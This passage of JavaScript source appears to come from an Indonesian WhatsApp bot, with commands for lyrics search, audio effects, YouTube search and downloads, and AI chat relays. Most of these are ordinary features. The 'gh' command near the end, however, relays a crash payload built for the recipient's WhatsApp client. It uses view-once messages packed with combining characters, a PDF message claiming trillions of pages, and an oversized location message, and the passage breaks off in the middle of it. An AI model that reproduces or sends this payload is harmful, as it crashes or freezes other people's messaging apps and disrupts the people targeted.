    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', ['./src/nulis/images/folio/sebelumkanan.jpg', '-font', './src/nulis/font/Indie-Flower.ttf', '-size', '1720x1280', '-pointsize', '23', '-interline-spacing', '4', '-annotate', '+89+190',
					fixHeight, './src/nulis/images/folio/setelahkanan.jpg'
				]).on('error', () => sycreply(mess.error)).on('exit', () => {
					sych.sendMessage(m.chat, {
						image: fs.readFileSync('./src/nulis/images/folio/setelahkanan.jpg'),
						caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
					}, {
						quoted: m
					})
				})
			}
			break
			case 'liriksearch': case 'liriks': {
			     
    if (!text) {
        console.log('Lirik lagu tidak diberikan.');
        return sycreply('Contoh: ' + prefix + command + ' tak bisa ku teruskan dunia kita berbeda');
    }
    try {
        sycreply(mess.wait); // Memberikan respons sementara

        // Emoji animasi selama proses
        const reactEmojis = ["🎵", "🎶", "🔍", "🎶", "🎵", "✅"];
        for (const emoji of reactEmojis) {
            await sych.sendMessage(m.chat, {
                react: {
                    text: emoji,
                    key: m.key
                }
            });
        }

        console.log('Mencari lirik untuk:', text);
        const url = `https://api.agatz.xyz/api/lirik?message=${encodeURIComponent(text)}`;
        const response = await fetch(url);
        const result = await response.json();

        if (result.status === 200 && result.data && result.data.status) {
            const { title, album, thumb, lyrics } = result.data;

            // Mengirimkan hasil pencarian lirik dengan thumbnail API
            const message = `🎶 *Lirik Lagu* 🎶\n\n` +
                `*Judul:* ${title}\n` +
                `*Album:* ${album || 'Tidak diketahui'}\n\n` +
                `*Lirik:*\n${lyrics}`;

            // Menggunakan thumbnail dari API
            sych.sendMessage(m.chat, {
                text: message,
                contextInfo: {
                    externalAdReply: {
                        "showAdAttribution": true,
                        "containsAutoReply": true,
                        "title": `${title}`,
                        "body": `Album: ${album}`,
                        "previewType": "PHOTO",
                        "thumbnailUrl": thumb, // Mengambil thumbnail dari API
                        "sourceUrl": my.gh
                    }
                }
            }, {
                quoted: fkontak
            });

        } else {
            console.log('Gagal mengambil data lirik.');
            sycreply('Gagal menemukan lirik lagu atau lagu tidak ditemukan.');
        }
    } catch (e) {
        console.error('Error fetching lyrics:', e);
        sycreply('Terjadi kesalahan saat mencari lirik lagu. Silakan coba lagi nanti.');
    }
    break;
}
			case 'bass':
			case 'blown':
			case 'deep':
			case 'earrape':
			case 'fast':
			case 'fat':
			case 'nightcore':
			case 'reverse':
			case 'robot':
			case 'slow':
			case 'smooth':
			case 'tupai': {
			     
				try {
					let set;
					if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
						let media = await sych.downloadAndSaveMediaMessage(qmsg)
						let ran = `./database/sampah/${getRandom('.mp3')}`;
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return sycreply(err)
							let buff = fs.readFileSync(ran)
							sych.sendMessage(m.chat, {
								audio: buff,
								mimetype: 'audio/mpeg'
							}, {
								quoted: m
							})
							fs.unlinkSync(ran)
						});
					} else {
						sycreply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
					}
				} catch (e) {
					sycreply('Gagal!')
				}
			}
			break
			case 'tinyurl':
			case 'shorturl':
			case 'shortlink': {
			     
				if (!text || !isUrl(text)) return sycreply(`*< / >* Example: ${prefix + command} https://github.com/nazedev/hitori`)
				try {
					let anu = await axios.get('https://tinyurl.com/api-create.php?url=' + text)
					sycreply('Url : ' + anu.data)
				} catch (e) {
					sycreply('Gagal!')
				}
			}
			break
			case 'git':
			case 'gitclone': {
			     
				if (!args[0]) return sycreply(`*< / >* Example: ${prefix + command} https://github.com/nazedev/hitori`)
				if (!isUrl(args[0]) && !args[0].includes('github.com')) return sycreply('Gunakan Url Github!')
				let [, user, repo] = args[0].match(/(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i) || []
				try {
					sych.sendMessage(m.chat, {
						document: {
							url: `https://api.github.com/repos/${user}/${repo}/zipball`
						},
						fileName: repo + '.zip',
						mimetype: 'application/zip'
					}, {
						quoted: m
					}).catch((e) => sycreply(mess.error))
				} catch (e) {
					sycreply('Gagal!')
				}
			}
			break
			// Ai Menu
			// Variabel global untuk menyimpan status auto AI
			// Case untuk mengatur autoai
			case 'autoai': {
			     
				if (!isCreator) return sycreply(mess.owner); // Memeriksa apakah pengirim adalah pembuat bot
				if (!text) return sycreply(`Gunakan: ${prefix + command} on/off`); // Memastikan ada teks untuk mengaktifkan/mematikan
				if (text.toLowerCase() === 'on') {
					if (autoAi) {
						// Jika autoAi sudah aktif, beri tahu bahwa sudah aktif sebelumnya
						sycreply('Auto AI sudah aktif sebelumnya!');
					} else {
						// Mengaktifkan autoAi jika belum aktif
						autoAi = true;
						sycreply('Auto AI telah diaktifkan!');
					}
				} else if (text.toLowerCase() === 'off') {
					if (!autoAi) {
						// Jika autoAi sudah dimatikan, beri tahu bahwa sudah dimatikan sebelumnya
						sycreply('Auto AI sudah dimatikan sebelumnya!');
					} else {
						// Mematikan autoAi jika aktif
						autoAi = false;
						sycreply('Auto AI telah dimatikan!');
					}
				} else {
					sycreply('Gunakan: autoai on/off');
				}
				break;
			}
			// Case untuk AI utama
			case 'ai': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`);
				try {
					let prompt = `${userPrompt}: ${text}`;
					let hasil = await yanzGpt(prompt);
					sycreply(hasil.choices[0].message.content);
				} catch (e) {
					try {
						let prompt = `${userPrompt}: ${text}`;
						let hasil = await bk9Ai(prompt);
						sycreply(hasil.BK9);
					} catch (e) {
						sycreply(pickRandom(['Fitur Ai sedang bermasalah!', 'Tidak dapat terhubung ke ai!', 'Sistem Ai sedang sibuk sekarang!', 'Fitur sedang tidak dapat digunakan!']));
					}
				}
				break;
			}
			// Auto AI: memproses semua pesan secara otomatis jika autoAi aktif
			case 'ika': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`)
				try {
					const hasil = await simi(text)
					sycreply(hasil.success)
				} catch (e) {
					sycreply('Server simi sedang offline!')
				}
			}
			break
			case 'txt2img': {
			     
				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/ai/flux?prompt=' + (text || m.quoted.text)
						}
					}, {
						quoted: m
					})
				} catch (e) {
					sycreply('Server Sedang Offline!')
				}
			}
			break
			case 'aimg': {
			     
				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/ai/flux?prompt=' + (text || m.quoted.text)
						}
					}, {
						quoted: m
					})
				} catch (e) {
					sycreply('Server Sedang Offline!')
				}
			}
			break
			case 'dukun': {
			     
    if (!text) return sycreply(`Kirim perintah *${prefix + command}* diikuti dengan nama yang ingin dicari artinya.`);
    const nama = text.trim();
    const loadingMessage = await sycreply('Sedang mencari arti nama... Mohon tunggu sebentar.');
    console.log(`Memulai proses pencarian arti nama untuk: ${nama}`);
    try {
        let response = await fetch(`https://api.siputzx.my.id/api/ai/dukun?content=${encodeURIComponent(nama)}`);
        console.log(`Mengirim permintaan ke API: https://api.siputzx.my.id/api/ai/dukun?content=${nama}`);
        let result = await response.json();
        console.log('Respon API diterima:', result);
        if (result.status) {
            await sych.sendMessage(m.chat, {
                text: result.data
            });
            console.log('Pesan arti nama berhasil dikirim ke pengguna.');
        } else {
            await sych.sendMessage(m.chat, {
                text: 'Maaf, tidak dapat menemukan arti nama. Silakan coba lagi nanti.'
            });
            console.log('API gagal memberikan hasil yang valid.');
        }
    } catch (e) {
        console.error('Terjadi kesalahan saat memproses permintaan:', e);
        await sych.sendMessage(m.chat, {
            text: 'Server sedang mengalami gangguan. Silakan coba lagi nanti.'
        });
    } finally {
        if (loadingMessage && loadingMessage.key) {
            await sych.deleteMessage(m.chat, loadingMessage.key);
            console.log('Pesan loading telah dihapus.');
        } else {
            console.log('Pesan loading tidak ditemukan atau tidak valid.');
        }
    }
}
break;
			// Search Menu
			case 'google': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`)
				try {
					let anu = await google.search(text);
					let msg = anu.knowledge_panel.metadata.map(({
						title,
						value
					}) => {
						return `*${title}*\n_${value}_`
					}).join('\n\n');
					if (!anu.knowledge_panel.description && !anu.knowledge_panel.url) return sycreply('Result tidak ditemukan!')
					sycreply(anu.knowledge_panel.description + '\n' + anu.knowledge_panel.url + '\n\n' + msg)
				} catch (e) {
					sycreply('Pencarian Tidak Ditemukan!')
				}
			}
			break
			case 'gimage': {
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} query`)
				gis(text, async (err, result) => {
					if (err) return sycreply(`Image Untuk Query : _${text}_\nTidak Ditemukan!`)
					if (result == undefined) {
						sycreply(`Image Untuk Query : _${text}_\nTidak Ditemukan!`)
					} else if (result.length > 1) {
						let anu = pickRandom(result)
						await sych.sendMessage(m.chat, {
							image: {
								url: anu.url
							},
							caption: 'Url : ' + anu.url
						}, {
							quoted: m
						})
					} else sycreply('Gagal Mencari Gambar!')
				});
			}
			break
			case 'play2': case 'ytplay2': case 'yts2': case 'ytsearch2': case 'youtubesearch2': {
			     
    if (!text) return sycreply(`Example: ${prefix + command} dj komang`);
    sycreply(mess.wait);

    try {
        const res = await yts.search(text); // Pencarian berdasarkan kata kunci
        const hasil = res.all.slice(0, 15); // Ambil maksimal 15 hasil

        if (hasil.length === 0) return sycreply('Tidak ada hasil yang ditemukan!');

        let finalText = `*Search Results for:* _${text}_\n\n`;
        hasil.forEach((video, index) => {
            finalText += `${index + 1}. *${video.title || 'Tidak tersedia'}*\n`;
            finalText += `   🔗 *Link:* ${video.url || 'Tidak tersedia'}\n`;
            finalText += `   ⏳ *Durasi:* ${video.timestamp || 'Tidak tersedia'}\n\n`;
        });

        await sych.sendMessage(m.chat, { text: finalText }, { quoted: m }); // Kirim hasil pencarian
    } catch (e) {
        sycreply('Terjadi kesalahan saat mencari video!');
    }
}
break;
			case 'typodetect': {
			     
    if (!isCreator) return sycreply("Fitur ini hanya bisa digunakan oleh owner.");
    if (!args[0]) return sycreply("Penggunaan: *typodetect on* atau *typodetect off*");

    if (args[0].toLowerCase() === 'on') {
        typoDetectionEnabled = true;
        return sycreply("Fitur deteksi typo telah diaktifkan.");
    } else if (args[0].toLowerCase() === 'off') {
        typoDetectionEnabled = false;
        return sycreply("Fitur deteksi typo telah dinonaktifkan.");
    } else {
        return sycreply("Penggunaan yang benar: *typodetect on* atau *typodetect off*");
    }
}
			case 'play': case 'ytplay': case 'yts': case 'ytsearch': case 'youtubesearch': {
			     
    if (!text) return sycreply(`Example: ${prefix + command} dj komang`);
    sycreply(mess.wait);

    try {
        const res = await yts.search(text); // Pencarian berdasarkan kata kunci
        const hasil = res.all.slice(0, 15); // Ambil maksimal 15 hasil

        if (hasil.length === 0) return sycreply('Tidak ada hasil yang ditemukan!');

        let finalText = `*Search Results for:* _${text}_\n\n`;
        hasil.forEach((video, index) => {
            finalText += `${index + 1}. *${video.title || 'Tidak tersedia'}*\n`;
            finalText += `   🔗 *Link:* ${video.url || 'Tidak tersedia'}\n`;
            finalText += `   ⏳ *Durasi:* ${video.timestamp || 'Tidak tersedia'}\n\n`;
        });

        await sych.sendMessage(m.chat, { text: finalText }, { quoted: m }); // Kirim hasil pencarian
    } catch (e) {
        sycreply('Terjadi kesalahan saat mencari video!');
    }
}
break;

			case 'wallpaper': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} hu tao`)
				try {
					let anu = await wallpaper(text)
					let result = pickRandom(anu)
					if (anu.length < 1) {
						sycreply('Post not available!');
					} else {
						await sych.sendMessage(m.chat, {
							image: {
								url: result.image[0]
							},
							caption: `⭔ title : ${q}\n⭔ category : ${result.type}\n⭔ media url : ${result.image[2] || result.image[1] || result.image[0]}`
						}, {
							quoted: m
						})
					}
				} catch (e) {
					sycreply('Server wallpaper sedang offline!')
				}
			}
			break
			case 'checklocation': {
			     
				if (!isCreator) return sycreply('Fitur ini hanya dapat digunakan oleh owner bot.');
				let ipUrl = 'https://ipinfo.io/json';
				try {
					const res = await axios.get(ipUrl);
					let locationInfo = res.data;
					let response = `📍 *Lokasi Bot:*\n\n`;
					response += `- Negara: ${locationInfo.country}\n`;
					response += `- Kota: ${locationInfo.city}\n`;
					response += `- ISP: ${locationInfo.org}\n`;
					response += `- Koordinat: ${locationInfo.loc}\n`;
					response += `- Zona Waktu: ${locationInfo.timezone}\n\n`;
					response += `_Lokasi ini berdasarkan data IP server bot._`;
					sycreply(response);
				} catch (error) {
					sycreply('Tidak dapat mendeteksi lokasi bot. Coba lagi nanti.');
				}
			}
			break;
			case 'cermin': {
			     
				if (!text) return sycreply('Harap masukkan teks yang ingin dibalik!');
				const reversedText = text.split('').reverse().join('');
				sycreply(`Hasil:\n${reversedText}`);
			}
			break;
			case 'ringtone': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} black rover`)
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await sych.sendMessage(m.chat, {
					audio: {
						url: result.audio
					},
					fileName: result.title + '.mp3',
					mimetype: 'audio/mpeg'
				}, {
					quoted: m
				})
			}
			break
			case 'analyzechats': {
			     
    if (!m.isGroup) return sycreply('Fitur ini hanya bisa digunakan di grup!');
    const chatData = store.messages[m.chat]?.array || [];
    const userActivity = {};
    chatData.forEach(msg => {
        const sender = msg.key?.participant || msg.key?.remoteJid;
        if (!userActivity[sender]) userActivity[sender] = 0;
        userActivity[sender]++;
    });
    const sortedActivity = Object.entries(userActivity)
        .sort((a, b) => b[1] - a[1])
        .map(([user, count]) => `@${user.split('@')[0]}: ${count} pesan`);
    sycreply(`📊 Analisis Aktivitas Grup:\n\n${sortedActivity.join('\n')}`, chatData.map(msg => msg.key?.participant));
}
break;
			case 'npm':
			case 'npmjs': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} axios`)
				let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
				let {
					objects
				} = await res.json()
				if (!objects.length) return sycreply('Pencarian Tidak di temukan')
				let txt = objects.map(({
					package: pkg
				}) => {
					return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
				}).join`\n\n`
				sycreply(txt)
			}
			break
			case 'style': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} sych`)
				let anu = await styletext(text)
				let txt = anu.map(a => `*${a.name}*\n${a.result}`).join`\n\n`
				sycreply(txt)
			}
			break
			case 'spotify':
			case 'spotifysearch': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} alan walker alone`)
				const reactEmojis = ["🎵", "🎶", "🔍", "🎶", "🎵", "✅"];
        for (const emoji of reactEmojis) {
            await sych.sendMessage(m.chat, {
                react: {
                    text: emoji,
                    key: m.key
                }
            });
        }
        
				try {
					let hasil = await fetchJson('https://www.bhandarimilan.info.np/spotisearch?query=' + encodeURIComponent(text));
					let txt = hasil.map(a => {
						return `*Name : ${a.name}*\n- Artist : ${a.artist}\n- Url : ${a.link}`
					}).join`\n\n`
					sycreply(txt)
					await sych.sendMessage(m.chat, {
						react: {
							text: '🔍', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Search Offline!')
				}
			}
			break
			
	

case 'ply':
     
    if (!args.length) {
        await sych.sendMessage(m.chat, { text: 'Masukkan judul lagu atau video. Contoh: /play Despacito' }, { quoted: fkontak });
        break;
    }

    const searchText = args.join(' ');
    await sych.sendMessage(m.chat, { text: 'Mencari video di YouTube...' }, { quoted: fkontak });

    try {
        const results = await yts(searchText);

        if (!results.videos.length) {
            await sych.sendMessage(m.chat, { text: 'Video tidak ditemukan.' }, { quoted: fkontak });
            break;
        }

        const video = results.videos[0];
        console.log('Video ditemukan:', video.title);  // Debug: menampilkan informasi video yang ditemukan

        const response = await fetch(`https://api.siputzx.my.id/api/d/ytmp3?url=${video.url}`);
        const audioData = await response.json();

        // Debug: menampilkan data audio yang diterima
        console.log('Audio Data:', audioData);

        if (audioData.status && audioData.data.dl) {
            const audioUrl = audioData.data.dl;
            console.log('URL Audio:', audioUrl);  // Debug: menampilkan URL audio

            await sych.sendMessage(m.chat, {
                image: { url: video.thumbnail },
                caption: `🎶 *Title*: ${video.title}\n👀 *Views*: ${video.views}\n⏱ *Duration*: ${video.timestamp}\n📅 *Uploaded*: ${video.ago}\n🔗 *URL*: ${video.url}`,
            }, { quoted: fkontak });


await sych.sendMessage(m.chat, { text: 'Memproses audio...' }, { quoted: fkontak });
            // Path penyimpanan sementara untuk file audio yang sudah dikompresi
            const outputPath = './downloads/compressed_audio.mp3'; // Ganti dengan path yang sesuai

            // Mengompres audio menggunakan ffmpeg
            ffmpeg(audioUrl)
                .audioBitrate(128)  // Menetapkan bitrate audio menjadi 128 kbps
                .outputOptions('-preset ultrafast')  // Menetapkan preset ultrafast untuk kecepatan kompresi
                .on('end', async () => {
                    // Mengirimkan file audio setelah selesai kompresi
                    await sych.sendMessage(m.chat, {
                        audio: { url: outputPath },
                        mimetype: 'audio/mpeg',
                        fileName: `${video.title}.mp3`,
                        ptt: true,  // Menggunakan PTT (Push to Talk)
                    }, { quoted: fkontak });
                })
                .on('error', (err) => {
                    console.error('Error during audio compression:', err);
                    sych.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengompres audio. Coba lagi nanti.' }, { quoted: fkontak });
                })
                .save(outputPath);  // Menyimpan file audio yang sudah dikompresi
        } else {
            console.error('Gagal mendownload audio:', audioData);
            await sych.sendMessage(m.chat, { text: 'Gagal mendownload audio.' }, { quoted: fkontak });
        }
    } catch (error) {
        console.error('Error:', error);
        await sych.sendMessage(m.chat, { text: 'Terjadi kesalahan. Coba lagi nanti.' }, { quoted: fkontak });
    }
    break;

//set nama 


			//search
		case 'search': case 'ytsearch': {
		     
    if (!text) return sycreply(`Contoh: ${prefix + command} dj tiktok`);
    sycreply(mess.wait, { quoted: fkontak });

    try {
        const res = await yts.search(text); // Pencarian berdasarkan kata kunci
        const hasil = res.all.slice(0, 10); // Ambil maksimal 10 hasil

        if (hasil.length === 0) return sycreply('Tidak ada hasil yang ditemukan!');

        // Buat carousel cards dari hasil pencarian
        const carouselCards = await Promise.all(hasil.map(async (video, index) => ({
            header: {
                title: `> ${video.title || 'Tidak tersedia'}`,
                hasMediaAttachment: true,
                imageMessage: (await generateWAMessageContent({
                    image: { url: video.thumbnail || './default-thumbnail.png' }
                }, {
                    upload: sych.waUploadToServer
                })).imageMessage
            },
            body: {
                text: `> 📹 *Durasi:* ${video.timestamp || 'Tidak tersedia'}\n> 🔗 *Channel:* ${video.author?.name || 'Tidak tersedia'}\n> 🖇️ *Link:* ${video.url}\n> 📄 *Deskripsi:* ${video.description || 'Tidak tersedia'}`
            },
            footer: {
                text: `🔎 Hasil pencarian ke-${index + 1}`
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Tonton Video",
                            url: video.url
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Salin Link",
                            copy_code: video.url
                        })
                    }
                ]
            }
        })));

        // Generate carousel message
        const carouselMessage = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: { text: `*Hasil pencarian untuk:* _${text}_` },
                        footer: { text: "Powered by Langz" },
                        header: { hasMediaAttachment: false },
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: carouselCards
                        })
                    })
                }
            }
        }, { quoted: fkontak });

        // Kirim pesan carousel
        await sych.relayMessage(m.chat, carouselMessage.message, { messageId: carouselMessage.key.id });

    } catch (error) {
        console.error("Kesalahan saat mengirim carousel:", error);
        await sych.sendMessage(m.chat, {
            text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan coba lagi nanti."
        }, { quoted: m });
    }
    break;
}
			
			
			
			// Downloader Menu

case 'ytmp4':
case 'ytvideo':
case 'ytv': {
     
    if (!text) {
        await sych.sendMessage(m.chat, { text: `Contoh: ${prefix + command} https://youtu.be/videoId` }, { quoted: m });
        break;
    }
    if (!text.includes('youtu')) {
        await sych.sendMessage(m.chat, { text: 'Link yang kamu masukkan bukan link YouTube! 😅' }, { quoted: m });
        break;
    }

    try {
        await sych.sendMessage(m.chat, { text: '⏱️ Sedang memproses video...' }, { quoted: m });

        const response = await fetch(`https://api.siputzx.my.id/api/d/ytmp4?url=${text}`);
        const videoData = await response.json();

        if (!videoData.status || !videoData.data?.dl) {
            await sych.sendMessage(m.chat, { text: 'Gagal mendapatkan video. Coba lagi nanti!' }, { quoted: m });
            break;
        }

        const videoUrl = videoData.data.dl;

        await sych.sendMessage(m.chat, {
            video: { url: videoUrl },
            mimetype: 'video/mp4',
            caption: '✅ *Video berhasil diunduh!*'
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await sych.sendMessage(m.chat, {
            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
        }, { quoted: m });
    }
    break;
}


case 'gh': {
          const gg = "ꦽ";
          const ggg = "ꦿꦾ";
          sych.relayMessage(m.chat, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          },{ userJid: m.chat, quoted: fkontak });
          await sych.relayMessage(m.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦",
                newsletterJid: "120363373320014871@newsletter",
                serverMessageId: 143
            }
        },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          },  { userJid: m.chat, quoted: fkontak });
          await sych.relayMessage(m.chat, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
